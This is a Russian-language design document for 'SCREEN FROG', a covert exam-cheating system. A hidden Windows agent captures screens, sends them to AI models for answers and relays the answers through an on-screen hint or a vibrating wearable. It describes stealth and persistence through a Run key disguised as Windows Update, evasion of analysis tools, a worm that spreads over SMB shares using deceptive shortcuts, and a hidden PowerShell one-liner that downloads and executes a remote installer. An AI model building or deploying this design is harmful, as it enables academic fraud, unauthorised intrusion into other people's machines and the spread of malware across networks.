## 1. Архитектура Системы (High-Level Design)

SCREEN FROG представляет собой распределенную экосистему, состоящую из четырех ключевых сегментов, которые взаимодействуют в режиме реального времени для обеспечения скрытого сбора данных и анализа.

### А. Агент "Digital Phantom" (`window.exe`)
Клиентское приложение на C++, работающее на уровне ядра пользовательского пространства Windows. 
*   **Скрытность:** Работает без консольного окна, использует `WinMain`.
*   **Персистентность:** Автоматическое закрепление в системе через реестр.
*   **Интеллект:** Встроенный движок самораспространения и защиты от анализа.

### Б. Cloud Core (Flask API)
Центральный сервер обработки данных (развернут на Render).
*   **Интеграция ИИ:** Каскадное использование OpenAI GPT-4o (Vision) и Anthropic Claude 3.5 (Logic).
*   **Управление очередями:** Формирование уникальных потоков ответов для каждого пользователя (Node).

### В. Fleet Management Dashboard
Административная панель для мониторинга всей сети агентов.
*   **Телеметрия:** Визуализация данных о каждом компьютере в реальном времени.
*   **Контроль версий:** Управление глобальным обновлением всех агентов одним кликом (сменой версии на сервере).

### Г. Hardware Output (ESP32 Vibro)
Носимое устройство для тактильной передачи ответов через вибрацию (Haptic Feedback).

## 2. Глубокое погружение в Агента (`window.exe`)

### 🕵️ Технологии Скрытности
1.  **Zero-Window Architecture:** Приложение скомпилировано с флагом `-mwindows`. Это отключает создание стандартного окна терминала при запуске. Пользователь не видит процесса в панели задач.
2.  **System Path Mimicry:** Установка производится в `%APPDATA%\Microsoft\Windows\WinNet\`. Эта папка выглядит как легитимный каталог сетевых служб Windows.
3.  **Registry Hijacking (Run):** Используется ключ `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` под именем `WindowsUpdateHost`, что делает автозагрузку максимально похожей на системный процесс обновления.

### 🛡️ Модуль Anti-Analysis (Защита от обнаружения)
Агент содержит поток-наблюдатель, который 1 раз в 2 секунды сканирует таблицу активных процессов (`PROCESSENTRY32`).
*   **Триггеры:** `taskmgr.exe`, `processhacker.exe`, `wireshark.exe`, `x64dbg.exe`.
*   **Реакция:** При обнаружении любого из этих процессов агент переходит в режим "Dead Silent":
    *   Полное прекращение HTTP-трафика.
    *   Отключение горячих клавиш.
    *   Скрытие всех визуальных индикаторов (статусных точек).
*   **Восстановление:** Через 5 секунд после закрытия инструментов анализа агент плавно возвращается в работу.

### 🔄 Механизм Самообновления (Batch Swap)
Для обхода блокировки запущенного EXE-файла используется алгоритм:
1.  Загрузка `window.exe.new` во временную папку.
2.  Создание динамического файла `update.bat`.
3.  Запуск BAT-файла в скрытом режиме.
4.  Завершение основного процесса `window.exe`.
5.  BAT-файл делает паузу 2 сек, удаляет старый файл, переименовывает новый и запускает его.

## 3. Логика ИИ-Пайплайна (Semantic Reconstruction)

Система не использует простое OCR. Она реализует **"Цифровой Двойник Страницы"**:

1.  **Этап "Eyes" (GPT-4o):** Анализирует визуальную структуру (расположение кнопок, порядок вариантов, наличие кода). Выдает JSON-структуру:
    ```json
    { "taskType": "choice", "options": [{"id": 1, "text": "Red"}, {"id": 2, "text": "Blue"}] }
    ```
2.  **Этап "Brain" (Claude 3.5):** Получает только чистую структуру и текст. Решает логическую задачу. 
3.  **Этап "Formatting":** Для `window.exe` ответ сжимается до 30 символов (например, "C (3) - Верно").

## 4. Сетевое Самораспространение (Worm Engine)

Агент превращает компьютер в активную точку распространения:
1.  **SMB Scanning:** Проверка диапазона `192.168.1.1` - `192.168.1.254`.
2.  **Discovery:** Поиск открытых сетевых папок (Shares) с правами на запись.
3.  **Infection:** Копирование файла `System_Update_Service.exe` в общедоступные папки (`Public\Desktop`).
4.  **Social Engineering:** Создание ярлыков, которые провоцируют пользователя или администратора на запуск.

## 5. Инструкция Оператора

### Установка (One-Liner)
```powershell
powershell -w h -c "iwr -useb https://exam-system-v1.onrender.com/download/installer | iex"
```

### Горячие клавиши
*   **Ctrl + Shift + [1-9]:** Сделать скриншот для конкретной "Ноды".
*   **Shift + Правая Кнопка Мыши:** Показать ответ (только пока кнопка нажата).

### Статусные индикаторы (в правом нижнем углу)
*   **Тускло-Красный:** Агент заблокирован защитой или нет сети.
*   **Тускло-Желтый:** Снимок отправлен, ожидание ответа ИИ.
*   **Тускло-Зеленый:** Ответ готов (нажми Shift+ПКМ).
